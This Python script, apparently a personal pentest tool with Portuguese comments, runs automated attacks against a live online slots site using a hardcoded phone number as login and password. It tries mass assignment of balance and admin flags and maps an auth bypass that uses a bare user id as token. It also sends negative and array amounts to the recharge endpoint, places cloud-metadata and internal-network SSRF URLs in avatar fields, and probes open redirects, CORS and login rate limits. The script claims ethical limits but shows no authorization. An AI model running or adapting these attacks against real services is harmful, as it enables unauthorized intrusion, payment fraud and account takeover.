"""
auto_burp_v2.py — Bateria 2.

Diferenças vs v1:
- Login fresco IMEDIATAMENTE antes de cada teste (contorna TTL curto).
- Cobre: mass assignment (refeito), mapa do "token anão", parameter
  pollution, HTTP method override, security headers, rate limiting,
  verbose errors, JS bundle secrets, SSRF em campos de perfil.

Ética:
- Todos os testes usam SOMENTE o uid próprio (137027) ou o uid 1 (que
  é só uma sonda pra confirmar bypass — sem enumeração).
- NÃO escreve em contas alheias.
- NÃO modifica saldo. NÃO força transações.
"""
from __future__ import annotations
import urllib.request, urllib.error, ssl, json, time, threading, hashlib, re, os, glob
from datetime import datetime, timezone

# ───────────────────────── config ─────────────────────────

BASE  = "https://ds.amizade777.com"
PKG   = "com.slots.big"
PHONE = "21998498419"
PWD   = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"
MY_UID = 137027

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

# ───────────────────────── http helpers ─────────────────────────

def _req(method, url, headers, body, timeout=10):
    try:
        r = urllib.request.Request(url, data=body, headers=headers, method=method)
        with urllib.request.urlopen(r, timeout=timeout, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read(8192).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        try:
            return e.code, dict(e.headers or {}), e.read(8192).decode("utf-8", "ignore")
        except Exception:
            return e.code, {}, ""
    except Exception as ex:
        return 0, {}, f"<EXC {type(ex).__name__}: {ex}>"

def post(path, data, token=None, extra_headers=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json",
        "Accept": "application/json, */*",
        "Origin": BASE, "Referer": BASE + "/",
    }
    if token: h["Token"] = token
    if extra_headers: h.update(extra_headers)
    url = path if path.startswith("http") else BASE + path
    st, hdrs, raw = _req("POST", url, h, json.dumps(data).encode())
    try:    return st, hdrs, json.loads(raw)
    except: return st, hdrs, {"_raw": raw[:300]}

def get(path, token=None, extra_headers=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, */*",
        "Origin": BASE, "Referer": BASE + "/",
    }
    if token: h["Token"] = token
    if extra_headers: h.update(extra_headers)
    url = path if path.startswith("http") else BASE + path
    st, hdrs, raw = _req("GET", url, h, None)
    try:    return st, hdrs, json.loads(raw)
    except: return st, hdrs, {"_raw": raw[:300]}

def login_fresh():
    payload = {
        "appChannel": "pc", "appPackageName": PKG, "deviceId": DID,
        "deviceModel": "WEB", "deviceVersion": "WEB", "appVersion": "1.0.0",
        "sysTimezone": None, "sysLanguage": None,
        "phone": PHONE, "password": PWD,
    }
    st, _, body = post("/prod-api/player/sign-in", payload)
    if body.get("code") != 200:
        raise RuntimeError(f"Login falhou: {body}")
    return body["data"]["token"], body["data"]["user_info"]

# ───────────────────────── relatório ─────────────────────────

RESULTS = []
SEV_TAG = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🔵","info":"⚪"}

def record(category, test, request, response, interpretation, severity="info"):
    e = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "category": category, "test": test,
        "request": request, "response": response,
        "interpretation": interpretation, "severity": severity,
    }
    RESULTS.append(e)
    code = response.get("code", "?")
    msg  = str(response.get("msg", ""))[:50]
    print(f"  {SEV_TAG.get(severity,'⚪')} [{category}/{test[:50]}] code={code} msg={msg!r}")
    if severity in ("critical", "high"):
        print(f"     ↪ {interpretation}")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 1 (REFEITO) — MASS ASSIGNMENT com login-por-payload
# ═══════════════════════════════════════════════════════════════════

def block_mass_assignment_v2():
    print("\n" + "=" * 60)
    print("BLOCO 1 (V2) — MASS ASSIGNMENT (login fresh por payload)")
    print("=" * 60)

    # Os campos que vamos tentar injetar. Cada item é (label, body extra).
    # Mantemos um campo legítimo (nickname) que sabemos que é aceito,
    # pra confirmar que o endpoint não está retornando erro genérico.
    payloads = [
        ("nickname_only_baseline",
            {"nickname": f"test_{MY_UID}"}),
        ("balance",
            {"nickname": f"test_{MY_UID}", "balance": 999999}),
        ("vip_level_camelCase",
            {"nickname": f"test_{MY_UID}", "vipLevel": 99}),
        ("vip_level_snake_case",
            {"nickname": f"test_{MY_UID}", "vip_level": 99}),
        ("isAdmin_true",
            {"nickname": f"test_{MY_UID}", "isAdmin": True}),
        ("is_admin_1",
            {"nickname": f"test_{MY_UID}", "is_admin": 1}),
        ("role_admin",
            {"nickname": f"test_{MY_UID}", "role": "admin"}),
        ("userType_admin",
            {"nickname": f"test_{MY_UID}", "userType": "admin"}),
        ("permissions_array",
            {"nickname": f"test_{MY_UID}", "permissions": ["admin", "superuser"]}),
        ("enable_force",
            {"nickname": f"test_{MY_UID}", "enable": 1}),
        ("ab_flip",
            {"nickname": f"test_{MY_UID}", "ab": "B"}),
        ("withdraw_amount",
            {"nickname": f"test_{MY_UID}", "withdraw_amount": 0}),
        ("recharge_amount",
            {"nickname": f"test_{MY_UID}", "recharge_amount": 999999}),
        ("invite_user_id",
            {"nickname": f"test_{MY_UID}", "invite_user_id": 1}),
        ("user_id_idor_self",
            {"nickname": f"test_{MY_UID}", "user_id": MY_UID}),
        ("withdraw_control_unlock",
            {"nickname": f"test_{MY_UID}", "withdraw_control": 1}),
        ("first_rw_reward_force",
            {"nickname": f"test_{MY_UID}", "first_rw_reward": 1}),
    ]

    for label, payload in payloads:
        try:
            # 1. login fresh
            token, ui = login_fresh()

            # 2. snapshot ANTES (POST player/info — no aphrodite era POST,
            #    aqui pode ser GET; tentamos ambos rapidamente)
            st_b, _, info_b = post("/prod-api/player/info", {}, token)
            if info_b.get("code") != 200:
                st_b, _, info_b = get("/prod-api/player/info", token)
            user_b = info_b.get("data", {}).get("user_info") or info_b.get("data") or {}

            # 3. UPDATE
            st_u, _, body_u = post("/prod-api/player/update", payload, token)

            # 4. snapshot DEPOIS
            st_a, _, info_a = post("/prod-api/player/info", {}, token)
            if info_a.get("code") != 200:
                st_a, _, info_a = get("/prod-api/player/info", token)
            user_a = info_a.get("data", {}).get("user_info") or info_a.get("data") or {}

            # 5. compara
            extra_field = next((k for k in payload if k != "nickname"), None)
            field_changed = (extra_field and
                             user_b.get(extra_field) != user_a.get(extra_field))
            nick_changed = user_b.get("nickname") != user_a.get("nickname")

            update_accepted = body_u.get("code") == 200
            sev = "info"
            interp = []
            if update_accepted:
                interp.append("Update aceito (code=200)")
            else:
                interp.append(f"Update rejeitado: {body_u.get('msg')}")

            if field_changed and extra_field:
                interp.append(f"⚠️ {extra_field} MUDOU: "
                              f"{user_b.get(extra_field)!r} → {user_a.get(extra_field)!r}")
                if extra_field in ("balance", "vipLevel", "vip_level",
                                   "isAdmin", "is_admin", "role", "userType",
                                   "permissions", "withdraw_amount",
                                   "recharge_amount", "user_id"):
                    sev = "critical"
                else:
                    sev = "high"
            elif update_accepted and nick_changed and label != "nickname_only_baseline":
                interp.append("Update aceito mas só o nickname mudou — "
                              "campo extra ignorado (boa prática).")

            record("mass_assignment_v2", label,
                   {"path": "/prod-api/player/update", "body": payload},
                   {"http_update": st_u,
                    "code_update": body_u.get("code"),
                    "msg_update": body_u.get("msg"),
                    "field_before": user_b.get(extra_field) if extra_field else None,
                    "field_after":  user_a.get(extra_field) if extra_field else None,
                    "nick_before":  user_b.get("nickname"),
                    "nick_after":   user_a.get("nickname")},
                   " | ".join(interp), sev)

            # Restaurar nick se mudou (volta pro padrão G137027)
            if nick_changed:
                token2, _ = login_fresh()
                post("/prod-api/player/update", {"nickname": f"G{MY_UID}"}, token2)

        except Exception as ex:
            record("mass_assignment_v2", label, {"body": payload},
                   {"err": str(ex)}, f"Exceção: {ex}", "info")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 2 — MAPA DO "TOKEN ANÃO" (quais endpoints aceitam)
# ═══════════════════════════════════════════════════════════════════

def block_dwarf_token_map():
    """Identifica quais endpoints aceitam Token=<uid_proprio>.

    Não enumera contas alheias. Só usa MY_UID (137027) e um sentinel
    inválido ("zzz") pra confirmar que o endpoint VALIDA tokens.
    """
    print("\n" + "=" * 60)
    print("BLOCO 2 — MAPA DO TOKEN ANÃO (qual endpoint aceita)")
    print("=" * 60)

    # Endpoints candidatos (lista pequena, todos métodos seguros).
    # Removidos: tudo que escreve.
    candidates = [
        # Saldo / wallet
        ("GET",  "/japi/user/balance/querySimpleBalance"),
        ("POST", "/japi/user/balance/querySimpleBalance"),
        ("GET",  "/japi/user/balance/queryBalance"),
        ("POST", "/japi/user/balance/queryBalance"),
        # Config
        ("POST", "/prod-api/set/get"),
        ("GET",  "/prod-api/set/get"),
        # Listas históricas
        ("GET",  "/prod-api/recharge-list"),
        ("POST", "/prod-api/recharge-list"),
        ("GET",  "/prod-api/payment/withdraw-list"),
        ("POST", "/prod-api/payment/withdraw-list"),
        # Convite
        ("GET",  "/prod-api/invite/userInvite"),
        ("POST", "/prod-api/invite/userInvite"),
        ("GET",  "/prod-api/invite/getBindRewardRecord"),
        ("POST", "/prod-api/invite/getBindRewardRecord"),
        # Perfil
        ("POST", "/prod-api/player/info"),
        ("GET",  "/prod-api/player/info"),
        # Atividades
        ("GET",  "/prod-api/year/api/yearRechargeReward"),
        ("POST", "/prod-api/activity/list"),
        ("GET",  "/prod-api/activity/list"),
        # VIP
        ("POST", "/prod-api/vip/info"),
        ("GET",  "/prod-api/vip/info"),
        ("POST", "/prod-api/vip/level"),
        # Bank
        ("GET",  "/prod-api/bank/list"),
        ("POST", "/prod-api/bank/list"),
        # Bonus
        ("POST", "/prod-api/bonus/list"),
        ("GET",  "/prod-api/bonus/list"),
        # Game
        ("POST", "/prod-api/game/list"),
        ("GET",  "/prod-api/game/list"),
    ]

    body_for = lambda m: ({"appPackageName": PKG, "appVersion": "1.0.0"}
                          if m == "POST" else None)

    vulnerable = []
    for method, path in candidates:
        # 1) com token anão (uid próprio)
        if method == "POST":
            st1, _, b1 = post(path, body_for(method), token=str(MY_UID))
        else:
            st1, _, b1 = get(path, token=str(MY_UID))
        # 2) com token claramente inválido
        if method == "POST":
            st2, _, b2 = post(path, body_for(method), token="zzz")
        else:
            st2, _, b2 = get(path, token="zzz")

        c1 = b1.get("code")
        c2 = b2.get("code")
        # Vulnerável: c1=200 e c2!=200
        if c1 == 200 and c2 != 200:
            vulnerable.append((method, path))
            record("dwarf_map", f"{method} {path}",
                   {"method": method, "path": path,
                    "tokens_tested": [str(MY_UID), "zzz"]},
                   {"code_dwarf": c1, "code_invalid": c2,
                    "data_keys": list(b1.get("data", {}).keys())
                                  if isinstance(b1.get("data"), dict) else None},
                   "Vulnerável ao token anão — bypass de auth confirmado.",
                   "critical")
        elif c1 == 200 and c2 == 200:
            # Endpoint público (não autentica nada)
            record("dwarf_map", f"{method} {path}",
                   {"method": method, "path": path},
                   {"code_dwarf": c1, "code_invalid": c2},
                   "Endpoint público (não exige token).", "low")
        else:
            # Endpoint OK ou 404
            pass

    print(f"\n  Total de endpoints VULNERÁVEIS: {len(vulnerable)}")
    for m, p in vulnerable:
        print(f"    🔴 {m} {p}")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 3 — Parameter pollution e HTTP method override
# ═══════════════════════════════════════════════════════════════════

def block_param_pollution():
    print("\n" + "=" * 60)
    print("BLOCO 3 — PARAMETER POLLUTION + HTTP METHOD OVERRIDE")
    print("=" * 60)

    # Parameter pollution: array no JSON, querystring duplicada
    token, _ = login_fresh()
    payload = {
        "token": token, "appPackageName": PKG, "appVersion": "1.0.0",
        "phone": PHONE, "configId": "", "qr": 1,
        "amount": [10, -100],   # array — pode confundir parser
    }
    st, _, body = post("/prod-api/pay-service/recharge", payload, token)
    record("param_pollution", "amount como array [10,-100]",
           {"body": payload}, {"http": st, "code": body.get("code"),
                               "msg": body.get("msg")},
           "Verifica se parser pega último ou primeiro elemento.",
           "high" if body.get("code") == 200 else "info")

    # Querystring com mesma chave repetida
    token, _ = login_fresh()
    st, _, body = post("/prod-api/pay-service/recharge?amount=10&amount=-100",
                        {"token": token, "appPackageName": PKG, "appVersion": "1.0.0",
                         "phone": PHONE, "configId": "", "amount": 50, "qr": 1},
                        token)
    record("param_pollution", "amount duplicado na URL",
           {"url_params": "amount=10&amount=-100"},
           {"http": st, "code": body.get("code"), "msg": body.get("msg")},
           "Verifica precedência body vs query.",
           "high" if body.get("code") == 200 else "info")

    # HTTP Method Override
    token, _ = login_fresh()
    for hdr_name in ("X-HTTP-Method-Override", "X-Method-Override",
                     "X-HTTP-Method", "_method"):
        for spoof in ("GET", "PUT", "DELETE", "PATCH"):
            st, _, body = post("/prod-api/player/update",
                                {"nickname": f"G{MY_UID}"}, token,
                                extra_headers={hdr_name: spoof})
            if body.get("code") == 200 and spoof in ("DELETE",):
                # DELETE bem-sucedido seria CRÍTICO
                record("method_override", f"{hdr_name}={spoof}",
                       {"header": hdr_name, "spoof_method": spoof},
                       {"code": body.get("code"), "msg": body.get("msg")},
                       f"Método {spoof} aceito via header — perigoso.",
                       "critical")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 4 — Verbose errors / stacktraces
# ═══════════════════════════════════════════════════════════════════

def block_verbose_errors():
    print("\n" + "=" * 60)
    print("BLOCO 4 — MENSAGENS DE ERRO VERBOSAS")
    print("=" * 60)

    token, _ = login_fresh()

    # Inputs malformados que podem travar parser e vazar stacktrace
    bad_inputs = [
        ("json_invalid",    "/prod-api/player/info", b"{not json"),
        ("xml_em_json",     "/prod-api/player/info", b"<xml/>"),
        ("array_root",      "/prod-api/player/info", b"[1,2,3]"),
        ("string_root",     "/prod-api/player/info", b'"abc"'),
        ("null_body",       "/prod-api/player/info", b"null"),
        ("recursive_json",  "/prod-api/player/info",
                            b'{"a":{"a":{"a":{"a":{"a":1}}}}}'),
    ]
    h_base = {
        "User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
        "Accept": "application/json", "Origin": BASE, "Referer": BASE + "/",
        "Token": token,
    }
    for label, path, body in bad_inputs:
        st, hdrs, raw = _req("POST", BASE + path, h_base, body)
        leaks = []
        for needle in ("Exception", "stacktrace", "at java.", "at org.",
                       "at com.", "Caused by", "Traceback", "panic:",
                       "nginx/", "Spring", "MySQL", "postgres", "redis"):
            if needle.lower() in raw.lower():
                leaks.append(needle)
        record("verbose_errors", label,
               {"body_bytes": body[:80].decode("utf-8","ignore")},
               {"http": st, "leaks": leaks, "raw_sample": raw[:300]},
               (f"Vaza: {leaks}" if leaks else "Sem vazamento detectado"),
               "medium" if leaks else "info")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 5 — Security headers
# ═══════════════════════════════════════════════════════════════════

def block_security_headers():
    print("\n" + "=" * 60)
    print("BLOCO 5 — HEADERS DE SEGURANÇA")
    print("=" * 60)

    st, hdrs, _ = get("/")
    expected = {
        "Strict-Transport-Security": "HSTS — força HTTPS",
        "Content-Security-Policy":   "CSP — mitiga XSS",
        "X-Content-Type-Options":    "nosniff — anti-MIME-confusion",
        "X-Frame-Options":           "anti-clickjacking",
        "Referrer-Policy":           "controle de referrer",
        "Permissions-Policy":        "Feature-Policy moderno",
    }
    missing = [h for h in expected if h not in hdrs and h.lower() not in
               {k.lower() for k in hdrs}]
    record("security_headers", "GET / response headers",
           {"path": "/"},
           {"present": list(hdrs.keys()), "missing": missing},
           f"Faltam {len(missing)} headers de segurança." if missing else
           "Todos headers presentes.",
           "medium" if len(missing) >= 3 else "low" if missing else "info")

    # CORS
    st, hdrs, _ = _req("OPTIONS", BASE + "/japi/user/balance/querySimpleBalance",
                       {"Origin": "https://attacker.com",
                        "Access-Control-Request-Method": "GET"}, None)
    aco = hdrs.get("Access-Control-Allow-Origin", "")
    acc = hdrs.get("Access-Control-Allow-Credentials", "")
    cors_bad = aco == "*" or aco == "https://attacker.com"
    record("security_headers", "CORS pre-flight",
           {"origin": "https://attacker.com"},
           {"ACO": aco, "ACC": acc},
           "CORS permissivo demais." if cors_bad else "CORS razoável.",
           "high" if cors_bad and acc.lower() == "true" else
           "medium" if cors_bad else "info")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 6 — Rate limiting no login
# ═══════════════════════════════════════════════════════════════════

def block_rate_limit():
    print("\n" + "=" * 60)
    print("BLOCO 6 — RATE LIMITING NO LOGIN (10 tentativas)")
    print("=" * 60)

    payload = {
        "appChannel": "pc", "appPackageName": PKG, "deviceId": DID,
        "deviceModel": "WEB", "deviceVersion": "WEB", "appVersion": "1.0.0",
        "sysTimezone": None, "sysLanguage": None,
        "phone": PHONE, "password": "senha_errada_xyz_" + str(time.time()),
    }
    times = []
    codes = []
    blocked_at = None
    for i in range(10):
        t0 = time.time()
        st, _, body = post("/prod-api/player/sign-in", payload)
        dt = time.time() - t0
        times.append(round(dt*1000))
        codes.append(body.get("code"))
        if body.get("code") not in (102008, 102001, 102002, 102003,
                                     200, 102004, 102005, 102006):
            # Algum erro novo apareceu — possível rate limit
            blocked_at = i
            break
        time.sleep(0.05)

    record("rate_limit", "login com senha errada x10",
           {"attempts": 10},
           {"times_ms": times, "codes": codes, "blocked_at": blocked_at},
           f"Bloqueio na tentativa {blocked_at}." if blocked_at is not None
           else "Sem rate limit detectado em 10 tentativas.",
           "high" if blocked_at is None else "info")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 7 — Secrets nos JS bundles
# ═══════════════════════════════════════════════════════════════════

def block_bundle_secrets():
    print("\n" + "=" * 60)
    print("BLOCO 7 — SECRETS NOS JS BUNDLES")
    print("=" * 60)

    bundles_dir = "bundles"
    if not os.path.isdir(bundles_dir):
        return

    patterns = {
        "AWS Access Key":   re.compile(r"AKIA[0-9A-Z]{16}"),
        "AWS Secret":       re.compile(r"(?i)aws_secret[\"']?\s*[:=]\s*[\"']([A-Za-z0-9/+]{40})"),
        "Google API Key":   re.compile(r"AIza[0-9A-Za-z_-]{35}"),
        "Generic Secret":   re.compile(r"(?i)(secret|api[_-]?key|password)\s*[:=]\s*[\"']([^\"'\s]{16,})"),
        "Bearer JWT":       re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"),
        "RSA Private":      re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
        "Telegram Bot":     re.compile(r"\b\d{9,10}:AA[A-Za-z0-9_-]{33}\b"),
        "Stripe Key":       re.compile(r"sk_(?:test|live)_[A-Za-z0-9]{24,}"),
        "Internal IP":      re.compile(r"\b(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168|192\.10)\.\d+\.\d+\b"),
        "Hardcoded URL":    re.compile(r"https?://(?:localhost|127\.0\.0\.1|0\.0\.0\.0|192\.|10\.|172\.)[\w./:?&=-]+"),
    }
    findings_by_type = {}
    for fp in glob.glob(os.path.join(bundles_dir, "*.js")) + \
              glob.glob(os.path.join(bundles_dir, "*.json")):
        try:
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception:
            continue
        for name, pat in patterns.items():
            for m in pat.finditer(content):
                key = name
                findings_by_type.setdefault(key, []).append(
                    {"file": os.path.basename(fp),
                     "match": m.group(0)[:80]})

    for name, hits in findings_by_type.items():
        # dedup por match
        seen = set()
        unique = []
        for h in hits:
            k = h["match"]
            if k not in seen:
                seen.add(k)
                unique.append(h)
        record("bundle_secrets", name,
               {"pattern": name, "hits": len(unique)},
               {"sample": unique[:5]},
               f"{len(unique)} matches únicos.",
               "high" if name in ("AWS Access Key", "AWS Secret",
                                  "Google API Key", "RSA Private",
                                  "Stripe Key", "Telegram Bot")
               else "medium" if name == "Generic Secret"
               else "low")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 8 — SSRF candidato (URL no perfil/avatar)
# ═══════════════════════════════════════════════════════════════════

def block_ssrf_avatar():
    print("\n" + "=" * 60)
    print("BLOCO 8 — SSRF EM CAMPOS DE PERFIL")
    print("=" * 60)

    token, _ = login_fresh()
    # Tenta colocar URLs internas em campos que podem ser baixados
    # pelo backend (avatar, fb_avatar, etc).
    targets = [
        "http://169.254.169.254/latest/meta-data/",      # AWS metadata
        "http://169.254.170.2/v2/credentials/",          # ECS metadata
        "http://192.10.0.168:3001/",                     # IP interno vazado
        "http://172.16.0.245:3001/",                     # IP interno do contexto
        "http://localhost:6379/",                         # Redis
        "http://localhost/admin",                         # painel local
    ]
    for url in targets:
        for field in ("avatar", "fb_avatar"):
            payload = {field: url}
            st, _, body = post("/prod-api/player/update", payload, token)
            interesting = (
                body.get("code") == 200 or
                "timeout" in str(body.get("msg","")).lower() or
                "refused" in str(body.get("msg","")).lower()
            )
            if interesting:
                record("ssrf", f"{field} = {url}",
                       {"path": "/prod-api/player/update", "body": payload},
                       {"http": st, "code": body.get("code"),
                        "msg": body.get("msg")},
                       "Resposta sugere que o backend tentou buscar a URL.",
                       "high" if body.get("code") == 200 else "medium")

# ═══════════════════════════════════════════════════════════════════
# BLOCO 9 — Open redirect
# ═══════════════════════════════════════════════════════════════════

def block_open_redirect():
    print("\n" + "=" * 60)
    print("BLOCO 9 — OPEN REDIRECT")
    print("=" * 60)

    targets = [
        "/?redirect=https://attacker.com",
        "/?next=https://attacker.com",
        "/?url=https://attacker.com",
        "/?return=https://attacker.com",
        "/?continue=https://attacker.com",
        "/login?back=https://attacker.com",
        "/logout?redirect=https://attacker.com",
    ]
    for path in targets:
        st, hdrs, _ = _req("GET", BASE + path,
                           {"User-Agent": "Mozilla/5.0"}, None)
        loc = hdrs.get("Location", "")
        if "attacker.com" in loc:
            record("open_redirect", path,
                   {"path": path}, {"http": st, "Location": loc},
                   "Open redirect confirmado.", "high")

# ═══════════════════════════════════════════════════════════════════
# Dump
# ═══════════════════════════════════════════════════════════════════

def dump_results():
    out_json = "auto_burp_v2_resultados.json"
    with open(out_json, "w", encoding="utf-8") as f:
        json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

    out_md = "auto_burp_v2_resultados.md"
    sev_order = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
    with open(out_md, "w", encoding="utf-8") as f:
        f.write("# Resultados — auto_burp_v2.py\n\n")
        f.write(f"_{datetime.now().isoformat()}_\n\n")
        # Resumo
        from collections import Counter
        c = Counter(e["severity"] for e in RESULTS)
        f.write("## Resumo\n\n")
        for sev in ("critical","high","medium","low","info"):
            f.write(f"- {SEV_TAG.get(sev,'')} {sev}: {c.get(sev,0)}\n")
        f.write("\n## Achados (ordenados por severidade)\n\n")
        for e in sorted(RESULTS, key=lambda x: sev_order.get(x["severity"],99)):
            if e["severity"] == "info":
                continue
            f.write(f"### [{e['severity'].upper()}] {e['category']} — {e['test']}\n\n")
            f.write(f"**Interpretação:** {e['interpretation']}\n\n")
            f.write("**Request:**\n```json\n")
            f.write(json.dumps(e["request"], ensure_ascii=False, indent=2, default=str))
            f.write("\n```\n\n**Response:**\n```json\n")
            f.write(json.dumps(e["response"], ensure_ascii=False, indent=2, default=str))
            f.write("\n```\n\n---\n\n")
    print(f"\n✅ Resultados em:\n  - {out_json}\n  - {out_md}")

def main():
    blocks = [
        ("mass_assignment_v2", block_mass_assignment_v2),
        ("dwarf_token_map",    block_dwarf_token_map),
        ("param_pollution",    block_param_pollution),
        ("verbose_errors",     block_verbose_errors),
        ("security_headers",   block_security_headers),
        ("rate_limit",         block_rate_limit),
        ("bundle_secrets",     block_bundle_secrets),
        ("ssrf_avatar",        block_ssrf_avatar),
        ("open_redirect",      block_open_redirect),
    ]
    for name, fn in blocks:
        try:
            fn()
        except Exception as ex:
            print(f"\n[ERRO bloco {name}]: {type(ex).__name__}: {ex}")
            record(name, "EXCEPTION", {}, {"error": str(ex)},
                   f"Bloco abortado: {ex}", "info")
        time.sleep(0.5)
    dump_results()

if __name__ == "__main__":
    main()
